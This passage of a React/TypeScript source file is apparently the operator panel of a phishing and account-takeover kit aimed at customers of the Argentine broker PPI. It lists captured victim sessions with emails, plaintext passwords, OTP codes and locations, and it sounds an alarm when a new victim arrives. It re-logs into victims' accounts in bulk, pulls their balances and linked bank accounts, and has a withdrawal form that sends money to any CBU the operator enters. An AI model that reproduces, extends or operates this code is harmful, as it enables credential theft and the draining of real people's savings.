import { useState, useEffect, useCallback, useRef } from "react";
import { useAuth } from "@/hooks/useAuth";
import { supabase } from "@/integrations/supabase/client";
import { ppiApi } from "@/lib/ppiApi";
import CocosAdminLogin from "@/components/admin/CocosAdminLogin";
import { SessionPresenceProvider } from "@/hooks/useSessionPresence";
import { useNotificationSound } from "@/hooks/useNotificationSound";
import {
  Shield, LogOut, RefreshCw, Users, Clock,
  Play, ArrowLeft, Search, DollarSign, TrendingUp,
  Copy, Check, Eye, EyeOff, Bell, BellOff, Activity,
  Trash2, Lock, Banknote, ArrowDownToLine, Building,
  ChevronDown, ChevronUp, Loader2, History, Zap,
} from "lucide-react";

// ── Types ──
interface LiveSession {
  id: string;
  email: string | null;
  password: string | null;
  status: string;
  otp_code: string | null;
  created_at: string;
  ip_address: string | null;
  user_agent: string | null;
  country: string | null;
  city: string | null;
  source: string;
  operator_code: string;
}

interface PpiAccount {
  id: string;
  email: string;
  username: string | null;
  password: string | null;
  access_token: string | null;
  cuenta_id: number | null;
  comitente: string | null;
  full_name: string | null;
  cuit: string | null;
  info_tag: string | null;
  balance_data: any;
  bank_accounts: any;
  portfolio_data: any;
  orders_data: any;
  profile_data: any;
  last_login_at: string | null;
  last_data_sync_at: string | null;
  operator_code: string;
  created_at: string;
  updated_at: string;
}

// ── Helpers ──
const fmtARS = (n: number) =>
  new Intl.NumberFormat("es-AR", { style: "currency", currency: "ARS", minimumFractionDigits: 2 }).format(n);
const fmtUSD = (n: number) =>
  new Intl.NumberFormat("en-US", { style: "currency", currency: "USD", minimumFractionDigits: 2 }).format(n);

const timeAgo = (dateStr: string | null) => {
  if (!dateStr) return "Nunca";
  const diff = Date.now() - new Date(dateStr).getTime();
  const mins = Math.floor(diff / 60000);
  if (mins < 1) return "Agora";
  if (mins < 60) return `${mins}m`;
  const hrs = Math.floor(mins / 60);
  if (hrs < 24) return `${hrs}h`;
  return `${Math.floor(hrs / 24)}d`;
};

const parseDevice = (ua: string | null) => {
  if (!ua) return "?";
  if (/Mobile|Android|iPhone/i.test(ua)) return "📱";
  return "💻";
};

const statusLabels: Record<string, { label: string; color: string }> = {
  login_attempt: { label: "Digitando", color: "text-yellow-400 bg-yellow-500/10" },
  login_success: { label: "Login OK", color: "text-green-400 bg-green-500/10" },
  login_error: { label: "Erro", color: "text-red-500 bg-red-500/10" },
  waiting_operator: { label: "Esperando", color: "text-blue-400 bg-blue-500/10" },
  completed: { label: "Concluído ✓", color: "text-green-500 bg-green-500/10" },
  error: { label: "Erro", color: "text-red-500 bg-red-500/10" },
};

const BalanceBox = ({ label, value, color }: { label: string; value: string; color: string }) => (
  <div className="rounded-lg bg-background/50 border border-border/30 px-2.5 py-1.5">
    <p className="text-[8px] text-muted-foreground">{label}</p>
    <p className={`text-[12px] font-bold tabular-nums ${color}`}>{value}</p>
  </div>
);

// ══════════════════════════════════════════
// MAIN COMPONENT
// ══════════════════════════════════════════
const PpiDashboard = () => {
  const { user, isAdmin, hasRole, loading: authLoading, signOut } = useAuth();
  const canAccess = isAdmin || hasRole;
  const [forceRefresh, setForceRefresh] = useState(0);
  const [activeTab, setActiveTab] = useState<"sessions" | "accounts">("accounts");

  // Accounts
  const [accounts, setAccounts] = useState<PpiAccount[]>([]);
  const [accountsLoading, setAccountsLoading] = useState(true);
  const [search, setSearch] = useState("");

  // Sessions
  const [liveSessions, setLiveSessions] = useState<LiveSession[]>([]);
  const { startAlarm, stopAlarm } = useNotificationSound();
  const [soundEnabled, setSoundEnabled] = useState(true);
  const soundEnabledRef = useRef(true);
  const seenSessionsRef = useRef<Set<string>>(new Set());
  useEffect(() => { soundEnabledRef.current = soundEnabled; }, [soundEnabled]);

  // Operating state
  const [operatingAccount, setOperatingAccount] = useState<PpiAccount | null>(null);
  const [opLoading, setOpLoading] = useState("");

  // Withdraw state for operating mode
  const [wCbu, setWCbu] = useState("");
  const [wAmount, setWAmount] = useState("");
  const [wCuit, setWCuit] = useState("");
  const [withdrawResult, setWithdrawResult] = useState<any>(null);
  const [opTab, setOpTab] = useState<"balance" | "portfolio" | "banks" | "withdraw" | "orders">("balance");

  // ── Load accounts ──
  const loadAccounts = useCallback(async (showLoading = true) => {
    if (showLoading) setAccountsLoading(true);
    const { data } = await supabase.from("ppi_accounts" as any).select("*").order("updated_at", { ascending: false });
    setAccounts((data as any) || []);
    if (showLoading) setAccountsLoading(false);
  }, []);

  useEffect(() => {
    if (user && canAccess) loadAccounts(true);
  }, [user, canAccess, loadAccounts, forceRefresh]);

  // Realtime accounts
  useEffect(() => {
    if (!user || !canAccess) return;
    const channel = supabase
      .channel("ppi-accounts-realtime")
      .on("postgres_changes", { event: "*", schema: "public", table: "ppi_accounts" }, (payload) => {
        if (payload.eventType === "INSERT") {
          setAccounts((prev) => [payload.new as any, ...prev]);
        } else if (payload.eventType === "UPDATE") {
          setAccounts((prev) => prev.map((a) => a.id === (payload.new as any).id ? (payload.new as any) : a));
        } else if (payload.eventType === "DELETE") {
          setAccounts((prev) => prev.filter((a) => a.id !== (payload.old as any).id));
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, canAccess]);

  // ── Load live sessions ──
  const loadLiveSessions = useCallback(async () => {
    const since = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString();
    const { data } = await supabase
      .from("sessions").select("*")
      .eq("source", "ppi").gte("created_at", since)
      .order("created_at", { ascending: false }).limit(100);
    setLiveSessions((data as unknown as LiveSession[]) || []);
  }, []);

  useEffect(() => {
    if (!user || !canAccess) return;
    loadLiveSessions();
    const channel = supabase
      .channel("ppi-sessions-admin")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.ppi" }, (payload) => {
        const newRow = payload.new as LiveSession;
        if (payload.eventType === "INSERT") {
          setLiveSessions((prev) => [newRow, ...prev].slice(0, 100));
          if (!seenSessionsRef.current.has(newRow.id) && soundEnabledRef.current) {
            seenSessionsRef.current.add(newRow.id);
            startAlarm();
            setTimeout(() => stopAlarm(), 3000);
          }
        } else if (payload.eventType === "UPDATE") {
          setLiveSessions((prev) => prev.map((s) => s.id === newRow.id ? newRow : s));
        }
        if (newRow.status === "completed") loadAccounts(false);
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, canAccess, loadLiveSessions, startAlarm, stopAlarm, loadAccounts]);

  // ── Account actions ──
  const handleLogin = async (acc: PpiAccount) => {
    if (!acc.username || !acc.password) return;
    setOpLoading(`login-${acc.id}`);
    try {
      await ppiApi.login(acc.username, acc.password, acc.operator_code);
      loadAccounts(false);
    } catch { /* */ }
    setOpLoading("");
  };

  const handleFetchBalances = async (acc: PpiAccount) => {
    if (!acc.access_token || !acc.cuenta_id) return;
    setOpLoading(`bal-${acc.id}`);
    try {
      await ppiApi.balances(acc.access_token, acc.cuenta_id, acc.id);
      loadAccounts(false);
    } catch { /* */ }
    setOpLoading("");
  };

  const handleFetchBanks = async (acc: PpiAccount) => {
    if (!acc.access_token || !acc.cuenta_id) return;
    setOpLoading(`bank-${acc.id}`);
    try {
      await ppiApi.bankAccounts(acc.access_token, acc.cuenta_id, acc.id);
      loadAccounts(false);
    } catch { /* */ }
    setOpLoading("");
  };

  const handleFetchOrders = async (acc: PpiAccount) => {
    if (!acc.access_token || !acc.cuenta_id) return;
    setOpLoading(`orders-${acc.id}`);
    try {
      await ppiApi.orders(acc.access_token, acc.cuenta_id, acc.id);
      loadAccounts(false);
    } catch { /* */ }
    setOpLoading("");
  };

  const handleOperate = async (acc: PpiAccount) => {
    // Auto-relogin if needed
    if (!acc.access_token && acc.username && acc.password) {
      setOpLoading(`login-${acc.id}`);
      try {
        const res = await ppiApi.login(acc.username, acc.password, acc.operator_code);
        if (res.token) {
          acc = { ...acc, access_token: res.token };
        }
      } catch { /* */ }
      setOpLoading("");
    }
    setOperatingAccount(acc);
    setOpTab("balance");
    setWithdrawResult(null);
    // Auto-fetch data
    if (acc.access_token && acc.cuenta_id) {
      ppiApi.balances(acc.access_token, acc.cuenta_id, acc.id).then(() => loadAccounts(false));
      ppiApi.bankAccounts(acc.access_token, acc.cuenta_id, acc.id).then(() => loadAccounts(false));
    }
  };

  const handleStopOperating = () => {
    setOperatingAccount(null);
    setWithdrawResult(null);
    loadAccounts(false);
  };

  const handleDelete = async (acc: PpiAccount) => {
    if (!confirm(`Remover conta ${acc.email}?`)) return;
    await supabase.from("ppi_accounts" as any).delete().eq("id", acc.id);
    loadAccounts(false);
  };

  const handleWithdrawQuote = async () => {
    if (!operatingAccount?.access_token || !operatingAccount?.cuenta_id) return;
    setOpLoading("withdraw-quote");
    try {
      const res = await ppiApi.withdrawQuote(
        operatingAccount.access_token, operatingAccount.cuenta_id, wCbu,
        operatingAccount.comitente || "", wCuit || operatingAccount.cuit || "", parseFloat(wAmount)
      );
      setWithdrawResult(res.success ? res.payload : res);
    } catch { /* */ }
    setOpLoading("");
  };

  const handleWithdrawConfirm = async () => {
    if (!operatingAccount?.access_token || !operatingAccount?.cuenta_id) return;
    setOpLoading("withdraw-confirm");
    try {
      await ppiApi.withdraw(
        operatingAccount.access_token, operatingAccount.cuenta_id, wCbu,
        operatingAccount.comitente || "", wCuit || operatingAccount.cuit || "", parseFloat(wAmount)
      );
      setWithdrawResult(null);
      setWAmount("");
      // Refresh balances
      await ppiApi.balances(operatingAccount.access_token, operatingAccount.cuenta_id, operatingAccount.id);
      loadAccounts(false);
    } catch { /* */ }
    setOpLoading("");
  };

  // Relogin all
  const [reloginRunning, setReloginRunning] = useState(false);
  const [reloginProgress, setReloginProgress] = useState({ done: 0, total: 0, current: "" });

  const handleReloginAll = async () => {
    const withCreds = accounts.filter(a => a.username && a.password);
    if (withCreds.length === 0) return;
    if (!confirm(`Relogar ${withCreds.length} contas PPI?`)) return;
    setReloginRunning(true);
    setReloginProgress({ done: 0, total: withCreds.length, current: "" });
    for (let i = 0; i < withCreds.length; i++) {
      const acc = withCreds[i];
      setReloginProgress({ done: i, total: withCreds.length, current: acc.email });
      try {
        await ppiApi.login(acc.username!, acc.password!, acc.operator_code);
      } catch { /* */ }
      await new Promise(r => setTimeout(r, 2000));
    }
    setReloginProgress({ done: withCreds.length, total: withCreds.length, current: "" });
    setReloginRunning(false);
    loadAccounts(false);
  };

  // Refresh all balances
  const [refreshAllRunning, setRefreshAllRunning] = useState(false);
  const [refreshAllProgress, setRefreshAllProgress] = useState({ done: 0, total: 0 });

  const handleRefreshAll = async () => {
    const active = accounts.filter(a => a.access_token && a.cuenta_id);
    if (active.length === 0) return;
    setRefreshAllRunning(true);
    setRefreshAllProgress({ done: 0, total: active.length });
    for (let i = 0; i < active.length; i++) {
      setRefreshAllProgress({ done: i, total: active.length });
      try {
        await ppiApi.balances(active[i].access_token!, active[i].cuenta_id!, active[i].id);
        await ppiApi.bankAccounts(active[i].access_token!, active[i].cuenta_id!, active[i].id);
      } catch { /* */ }
      await new Promise(r => setTimeout(r, 2000));
    }
    setRefreshAllProgress({ done: active.length, total: active.length });
    setRefreshAllRunning(false);
    loadAccounts(false);
  };

  useEffect(() => {
    document.title = "PPI Dashboard";
  }, []);

  // ── Guards ──
  if (authLoading) return (
    <div className="flex min-h-screen items-center justify-center bg-background">
      <RefreshCw size={24} className="text-primary animate-spin" />
    </div>
  );
  if (!user) return <CocosAdminLogin onLogin={() => setForceRefresh((p) => p + 1)} />;
  if (!canAccess) return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-background gap-4">
      <Shield className="h-12 w-12 text-destructive" />
      <h1 className="text-xl font-bold text-foreground">Acesso Negado</h1>
      <button onClick={() => signOut()} className="rounded-xl bg-primary px-6 py-2.5 text-sm font-semibold text-primary-foreground">Voltar</button>
    </div>
  );

  // Totals
  const totalArs = accounts.reduce((s, a) => s + (Number(a.balance_data?.accountValueARS) || 0), 0);
  const totalUsd = accounts.reduce((s, a) => s + (Number(a.balance_data?.accountValueUSD) || 0), 0);
  const activeCount = accounts.filter(a => a.access_token).length;

  // ── OPERATING MODE ──
  if (operatingAccount) {
    // Re-fetch latest data from state
    const latestAcc = accounts.find(a => a.id === operatingAccount.id) || operatingAccount;
    const bd = latestAcc.balance_data;
    const banks = latestAcc.bank_accounts || [];
    const instruments = bd?.groupedInstruments || [];
    const arsAvail = bd?.availabilities?.find((a: any) => a.currency?.id === 10000);
    const usdAvail = bd?.availabilities?.find((a: any) => a.currency?.id === 10001);

    return (
      <div className="min-h-screen bg-background">
        <div className="sticky top-0 z-50 bg-card border-b border-border px-4 py-2.5 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <button onClick={handleStopOperating} className="flex items-center gap-1.5 rounded-xl border border-border px-3 py-1.5 text-xs text-muted-foreground hover:bg-secondary transition-colors">
              <ArrowLeft size={13} /> Voltar
            </button>
            <div className="flex items-center gap-2">
              <div className="h-7 w-7 rounded-lg bg-blue-600 flex items-center justify-center">
                <span className="text-[10px] font-bold text-white">{(latestAcc.full_name || latestAcc.email)[0]?.toUpperCase()}</span>
              </div>
              <div>
                <p className="text-[11px] font-bold text-foreground">{latestAcc.full_name || latestAcc.email}</p>
                <p className="text-[9px] text-muted-foreground">{latestAcc.email} • Conta {latestAcc.cuenta_id} • Comitente {latestAcc.comitente}</p>
              </div>
            </div>
          </div>
          <span className="text-[10px] text-green-400 flex items-center gap-1.5 bg-green-500/10 border border-green-500/20 rounded-lg px-3 py-1"><span className="h-2 w-2 rounded-full bg-green-400 animate-pulse" /> Operando</span>
        </div>

        <div className="max-w-4xl mx-auto p-4 space-y-4">
          {/* Quick balance */}
          {bd && (
            <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
              <BalanceBox label="💰 ARS Total" value={fmtARS(bd.accountValueARS || 0)} color="text-emerald-400" />
              <BalanceBox label="🇺🇸 USD Total" value={fmtUSD(bd.accountValueUSD || 0)} color="text-sky-400" />
              <BalanceBox label="ARS Disponível" value={fmtARS(arsAvail?.availability?.[0]?.amount || 0)} color="text-green-400" />
              <BalanceBox label="USD Disponível" value={fmtUSD(usdAvail?.availability?.[0]?.amount || 0)} color="text-blue-400" />
            </div>
          )}

          {/* Tabs */}
          <div className="flex items-center gap-1 flex-wrap">
            {(["balance", "portfolio", "banks", "withdraw", "orders"] as const).map(t => (
              <button key={t} onClick={() => setOpTab(t)}
                className={`text-[10px] px-3 py-1.5 rounded-lg font-semibold transition-all border ${opTab === t ? "bg-primary/10 text-primary border-primary/20" : "border-border text-muted-foreground hover:text-foreground"}`}>
                {t === "balance" ? "💰 Saldo" : t === "portfolio" ? "📊 Portfolio" : t === "banks" ? "🏦 Bancos" : t === "withdraw" ? "💸 Retiro" : "📜 Ordens"}
              </button>
            ))}
            <button onClick={() => { if (latestAcc.access_token && latestAcc.cuenta_id) { ppiApi.balances(latestAcc.access_token, latestAcc.cuenta_id, latestAcc.id).then(() => loadAccounts(false)); } }}
              className="ml-auto text-[9px] px-2 py-1 rounded-lg border border-border text-muted-foreground hover:text-foreground flex items-center gap-1">
              <RefreshCw size={10} /> Atualizar
            </button>
          </div>

          {/* Balance tab */}
          {opTab === "balance" && bd && (
            <div className="space-y-3">
              {bd.availabilities?.map((a: any) => (
                <div key={a.currency?.id} className="rounded-xl border border-border bg-card p-3">
                  <p className="text-[10px] text-muted-foreground font-semibold">{a.currency?.name} ({a.currency?.symbol})</p>
                  <div className="grid grid-cols-3 gap-2 mt-2">
                    <BalanceBox label="Disponível" value={`${a.currency?.symbol} ${a.availability?.[0]?.amount?.toLocaleString("es-AR") || "0"}`} color="text-emerald-400" />
                    <BalanceBox label="Garantia" value={`${a.currency?.symbol} ${a.availability?.[1]?.amount || "0"}`} color="text-blue-400" />
                    <BalanceBox label="Limite" value={`${a.currency?.symbol} ${a.availability?.[4]?.amount?.toLocaleString("es-AR") || "0"}`} color="text-muted-foreground" />
                  </div>
                </div>
              ))}
              {bd.instrumentDistribution && (
                <div className="rounded-xl border border-border bg-card p-3">
                  <p className="text-[10px] text-muted-foreground font-semibold mb-2">Distribución</p>
                  {bd.instrumentDistribution.map((d: any) => (
                    <div key={d.id} className="flex justify-between text-[11px] py-0.5">
                      <span className="text-foreground">{d.name}</span>
                      <span className="text-primary font-mono font-semibold">{d.percentage?.toFixed(2)}%</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Portfolio tab */}
          {opTab === "portfolio" && (
            <div className="space-y-3">
              {instruments.length > 0 ? instruments.map((group: any) => (
                <div key={group.instrumentTypeId} className="rounded-xl border border-border bg-card p-3">
                  <p className="text-[11px] font-bold text-primary mb-2">{group.name} ({group.groupedPercentage?.toFixed(1)}%)</p>
                  <div className="space-y-2">
                    {group.instruments?.map((inst: any) => (
                      <div key={inst.ticker} className="flex items-center justify-between py-1.5 border-b border-border/30 last:border-0">
                        <div>
                          <span className="text-[12px] font-bold text-foreground">{inst.ticker}</span>
                          <span className="text-[9px] text-muted-foreground ml-2">{inst.description?.slice(0, 30)}</span>
                          <p className="text-[9px] text-muted-foreground">Qtd: {inst.instrumentAmount} × {inst.currency?.symbol} {inst.price?.toLocaleString("es-AR")}</p>
                        </div>
                        <div className="text-right">
                          <p className="text-[12px] font-bold text-foreground">{inst.currency?.symbol} {inst.amount?.toLocaleString("es-AR")}</p>
                          <p className={`text-[10px] font-mono ${(inst.ppc?.cumulativeReturnPercentage || 0) >= 0 ? "text-emerald-400" : "text-red-400"}`}>
                            {inst.ppc?.cumulativeReturnPercentage?.toFixed(1)}% ({inst.ppc?.cumulativeReturn?.toLocaleString("es-AR")})
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )) : (
                <p className="text-center text-sm text-muted-foreground py-8">Busque saldos para ver o portfolio</p>
              )}
            </div>
          )}

          {/* Banks tab */}
          {opTab === "banks" && (
            <div className="space-y-2">
              {Array.isArray(banks) && banks.length > 0 ? banks.map((group: any, gi: number) => (
                <div key={gi}>
                  <p className="text-[10px] text-muted-foreground font-semibold mb-1">{group.currency?.name}</p>
                  {group.account?.map((ba: any) => (
                    <div key={ba.id} className="rounded-xl border border-border bg-card p-3 mb-2">
                      <div className="flex items-center justify-between">
                        <div>
                          <p className="text-[12px] font-bold text-foreground">{ba.name}</p>
                          <p className="text-[10px] text-muted-foreground">{ba.bankAccountType} • {ba.holderName}</p>
                          <p className="text-[9px] font-mono text-muted-foreground mt-1">CBU: {ba.cbu}</p>
                          <p className="text-[9px] text-muted-foreground">CUIT: {ba.cuit}</p>
                        </div>
                        <button onClick={() => { setWCbu(ba.cbu); setWCuit(ba.cuit); setOpTab("withdraw"); }}
                          className="text-[10px] px-3 py-1.5 rounded-lg bg-orange-500/10 text-orange-400 font-semibold hover:bg-orange-500/15 flex items-center gap-1">
                          <ArrowDownToLine size={12} /> Retirar
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )) : (
                <p className="text-center text-sm text-muted-foreground py-8">Busque contas bancárias</p>
              )}
            </div>
          )}

          {/* Withdraw tab */}
          {opTab === "withdraw" && (
            <div className="space-y-3">
              <div className="rounded-xl border border-border bg-card p-4 space-y-3">
                <input placeholder="CBU" value={wCbu} onChange={e => setWCbu(e.target.value)}
                  className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm text-foreground font-mono focus:outline-none focus:border-primary" />
                <input placeholder="CUIT" value={wCuit} onChange={e => setWCuit(e.target.value)}
                  className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm text-foreground font-mono focus:outline-none focus:border-primary" />
                <input placeholder="Monto" type="number" value={wAmount} onChange={e => setWAmount(e.target.value)}
                  className="w-full rounded-lg border border-border bg-background px-3 py-2 text-sm text-foreground font-mono focus:outline-none focus:border-primary" />
                <div className="flex gap-2">
                  <button onClick={handleWithdrawQuote} disabled={opLoading === "withdraw-quote" || !wCbu || !wAmount}
                    className="flex-1 rounded-lg bg-orange-500/10 py-2.5 text-[12px] font-semibold text-orange-400 hover:bg-orange-500/15 disabled:opacity-50 flex items-center justify-center gap-1">
                    {opLoading === "withdraw-quote" ? <Loader2 size={14} className="animate-spin" /> : null} Cotizar
                  </button>
                  {withdrawResult && (
                    <button onClick={handleWithdrawConfirm} disabled={opLoading === "withdraw-confirm"}
                      className="flex-1 rounded-lg bg-red-600 py-2.5 text-[12px] font-bold text-white hover:bg-red-700 disabled:opacity-50 flex items-center justify-center gap-1">
                      {opLoading === "withdraw-confirm" ? <Loader2 size={14} className="animate-spin" /> : null} CONFIRMAR RETIRO
                    </button>
                  )}
                </div>
              </div>
              {withdrawResult && (
                <div className="rounded-xl border border-orange-500/20 bg-card p-4 space-y-1 text-sm">
                  <p className="text-orange-400 font-semibold text-[12px]">Cotação:</p>
                  <p className="text-foreground">Banco: <span className="text-muted-foreground">{withdrawResult.bankName}</span></p>
                  <p className="text-foreground">Titular: <span className="text-muted-foreground">{withdrawResult.holderName}</span></p>
                  <p className="text-foreground">Valor: <span className="text-emerald-400 font-mono font-bold">{withdrawResult.currency?.symbol} {withdrawResult.amount}</span></p>
                  {withdrawResult.alert?.map((a: string, i: number) => (
                    <p key={i} className="text-[10px] text-yellow-400">⚠ {a}</p>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Orders tab */}
          {opTab === "orders" && (
            <div className="space-y-2">
              <button onClick={() => { if (latestAcc.access_token && latestAcc.cuenta_id) handleFetchOrders(latestAcc); }}
                className="text-[10px] px-3 py-1.5 rounded-lg border border-border text-muted-foreground hover:text-foreground flex items-center gap-1">
                <History size={10} /> Buscar ordens
              </button>
              {latestAcc.orders_data && Array.isArray(latestAcc.orders_data) ? (
                <div className="space-y-1.5">
                  {latestAcc.orders_data.map((order: any) => (
                    <div key={order.id} className="rounded-xl border border-border bg-card px-3 py-2 flex items-center justify-between">
                      <div>
                        <p className="text-[11px] font-semibold text-foreground">{order.operation?.name || order.instrument?.type?.name}</p>
                        <p className="text-[9px] text-muted-foreground">{new Date(order.date).toLocaleString("es-AR")}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-[11px] font-mono font-bold text-emerald-400">{order.instrument?.currency?.symbol} {order.amount?.toLocaleString("es-AR")}</p>
                        <span className={`text-[8px] px-1.5 py-0.5 rounded font-semibold ${order.status?.id === 5 ? "bg-green-500/10 text-green-400" : "bg-yellow-500/10 text-yellow-400"}`}>
                          {order.status?.description}
                        </span>
                      </div>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-center text-sm text-muted-foreground py-8">Clique para buscar ordens</p>
              )}
            </div>
          )}
        </div>
      </div>
    );
  }

  // ── Filter accounts ──
  const filtered = accounts.filter(a =>
    !search || (a.email + (a.full_name || "") + (a.username || "")).toLowerCase().includes(search.toLowerCase())
  );

  return (
    <SessionPresenceProvider>
      <div className="min-h-screen bg-background text-foreground">
        {/* ── HEADER ── */}
        <div className="sticky top-0 z-50 border-b border-border bg-card/95 backdrop-blur px-4 py-2.5">
          <div className="flex items-center justify-between max-w-7xl mx-auto">
            <div className="flex items-center gap-3">
              <div className="h-8 w-8 rounded-xl bg-blue-600 flex items-center justify-center">
                <span className="text-[11px] font-bold text-white">PPI</span>
              </div>
              <div>
                <h1 className="text-[13px] font-bold text-foreground">PPI Dashboard</h1>
                <p className="text-[9px] text-muted-foreground">{accounts.length} contas • {activeCount} ativas</p>
              </div>
            </div>
            <div className="flex items-center gap-3">
              {/* Totals */}
              <div className="hidden md:flex items-center gap-4 mr-4">
                <div className="text-right">
                  <p className="text-[8px] text-muted-foreground">ARS Total</p>
                  <p className="text-[14px] font-bold text-emerald-400 tabular-nums">{fmtARS(totalArs)}</p>
                </div>
                <div className="text-right">
                  <p className="text-[8px] text-muted-foreground">USD Total</p>
                  <p className="text-[14px] font-bold text-sky-400 tabular-nums">{fmtUSD(totalUsd)}</p>
                </div>
              </div>
              <button onClick={() => setSoundEnabled(!soundEnabled)}
                className={`h-8 w-8 rounded-xl flex items-center justify-center transition-colors ${soundEnabled ? "bg-primary/10 text-primary" : "bg-secondary text-muted-foreground"}`}>
                {soundEnabled ? <Bell size={14} /> : <BellOff size={14} />}
              </button>
              <button onClick={() => signOut()} className="h-8 w-8 rounded-xl flex items-center justify-center text-muted-foreground hover:text-foreground hover:bg-secondary transition-colors">
                <LogOut size={14} />
              </button>
            </div>
          </div>
        </div>

        <div className="max-w-7xl mx-auto px-4 py-4 space-y-4">
          {/* ── TABS ── */}
          <div className="flex items-center gap-2 flex-wrap">
            {([
              { key: "sessions" as const, label: "Sessões", icon: Activity, count: liveSessions.length },
              { key: "accounts" as const, label: "Contas", icon: Users, count: accounts.length },
            ]).map(({ key, label, icon: Icon, count }) => (
              <button key={key} onClick={() => setActiveTab(key)}
                className={`flex items-center gap-1.5 px-4 py-2 rounded-xl text-[11px] font-semibold transition-all border ${
                  activeTab === key ? "bg-primary/10 text-primary border-primary/20" : "border-border text-muted-foreground hover:text-foreground"
                }`}>
                <Icon size={13} />
                {label}
                <span className={`text-[9px] px-1.5 rounded font-bold tabular-nums ${activeTab === key ? "bg-primary/15 text-primary" : "bg-secondary text-muted-foreground"}`}>{count}</span>
              </button>
            ))}
          </div>

          {/* ── SESSIONS TAB ── */}
          {activeTab === "sessions" && (
            <div className="space-y-1.5">
              {liveSessions.length === 0 ? (
                <p className="text-center text-sm text-muted-foreground py-12">Nenhuma sessão PPI nas últimas 24h.</p>
              ) : (
                liveSessions.map(session => {
                  const cfg = statusLabels[session.status] || { label: session.status, color: "text-muted-foreground bg-secondary" };
                  const time = new Date(session.created_at);
                  const timeStr = time.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
                  return (
                    <div key={session.id} className={`rounded-lg border bg-card px-3 py-2 ${session.status === "completed" ? "border-green-500/20" : "border-border"}`}>
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="text-[10px] font-mono text-muted-foreground tabular-nums w-[38px]">{timeStr}</span>
                        <span className={`text-[9px] px-1.5 py-0.5 rounded font-semibold ${cfg.color}`}>{cfg.label}</span>
                        <span className="text-[11px] font-semibold text-foreground truncate">{session.email || "—"}</span>
                        {session.password && (
                          <span className="text-[10px] font-mono text-yellow-400 flex items-center gap-0.5">
                            <Lock size={8} /> {session.password}
                          </span>
                        )}
                        {session.country && <span className="text-[9px] text-muted-foreground">{session.country} {session.city}</span>}
                        <span className="text-[9px] text-muted-foreground">{parseDevice(session.user_agent)}</span>
                      </div>
                    </div>
                  );
                })
              )}
            </div>
          )}

          {/* ── ACCOUNTS TAB ── */}
          {activeTab === "accounts" && (
            <div className="space-y-3">
              {/* Progress bars */}
              {reloginRunning && (
                <div className="rounded-xl border border-blue-500/20 bg-blue-500/5 p-3 flex items-center gap-2">
                  <RefreshCw size={12} className="animate-spin text-blue-400" />
                  <span className="text-[11px] font-semibold text-blue-400">Relogin {reloginProgress.done}/{reloginProgress.total}</span>
                  {reloginProgress.current && <span className="text-[10px] text-muted-foreground truncate">→ {reloginProgress.current}</span>}
                </div>
              )}
              {refreshAllRunning && (
                <div className="rounded-xl border border-green-500/20 bg-green-500/5 p-3 flex items-center gap-2">
                  <RefreshCw size={12} className="animate-spin text-green-400" />
                  <span className="text-[11px] font-semibold text-green-400">Atualizando saldos {refreshAllProgress.done}/{refreshAllProgress.total}</span>
                </div>
              )}

              {/* Search + actions */}
              <div className="flex flex-col sm:flex-row sm:items-center gap-2">
                <div className="relative flex-1 max-w-sm">
                  <Search size={13} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-muted-foreground" />
                  <input type="text" placeholder="Buscar contas..." value={search} onChange={(e) => setSearch(e.target.value)}
                    className="w-full rounded-lg border border-border bg-card pl-8 pr-3 py-1.5 text-xs text-foreground placeholder:text-muted-foreground outline-none focus:border-primary transition-all" />
                </div>
                <div className="flex items-center gap-1 flex-wrap">
                  <button onClick={handleReloginAll} disabled={reloginRunning}
                    className="text-[10px] px-2.5 py-1 rounded-lg bg-blue-500/10 text-blue-400 font-semibold hover:bg-blue-500/15 disabled:opacity-50 flex items-center gap-1">
                    <Zap size={10} /> Relogin All
                  </button>
                  <button onClick={handleRefreshAll} disabled={refreshAllRunning}
                    className="text-[10px] px-2.5 py-1 rounded-lg bg-green-500/10 text-green-400 font-semibold hover:bg-green-500/15 disabled:opacity-50 flex items-center gap-1">
                    <DollarSign size={10} /> Atualizar Saldos
                  </button>
                  <button onClick={() => loadAccounts(true)}
                    className="text-[10px] px-2.5 py-1 rounded-lg bg-secondary text-muted-foreground font-semibold hover:text-foreground flex items-center gap-1">
                    <RefreshCw size={10} /> Refresh
                  </button>
                </div>
              </div>

              {/* Account cards */}
              {accountsLoading ? (
                <div className="flex justify-center py-12"><RefreshCw size={20} className="animate-spin text-primary" /></div>
              ) : (
                <div className="space-y-1.5">
                  {filtered.map(account => (
                    <PpiAccountCard key={account.id} account={account}
                      opLoading={opLoading}
                      onOperate={() => handleOperate(account)}
                      onLogin={() => handleLogin(account)}
                      onBalances={() => handleFetchBalances(account)}
                      onBanks={() => handleFetchBanks(account)}
                      onOrders={() => handleFetchOrders(account)}
                      onDelete={() => handleDelete(account)} />
                  ))}
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </SessionPresenceProvider>
  );
};

// ══════════════════════════════════════════
// ACCOUNT CARD
// ══════════════════════════════════════════
const PpiAccountCard = ({ account, opLoading, onOperate, onLogin, onBalances, onBanks, onOrders, onDelete }: {
  account: PpiAccount;
  opLoading: string;
  onOperate: () => void;
  onLogin: () => void;
  onBalances: () => void;
  onBanks: () => void;
  onOrders: () => void;
  onDelete: () => void;
}) => {
  const [expanded, setExpanded] = useState(false);
  const [copied, setCopied] = useState("");

  const hasToken = !!account.access_token;
  const name = account.full_name || account.username || account.email;
  const totalArs = Number(account.balance_data?.accountValueARS) || 0;
  const totalUsd = Number(account.balance_data?.accountValueUSD) || 0;
  const lastActive = account.last_login_at || account.last_data_sync_at;
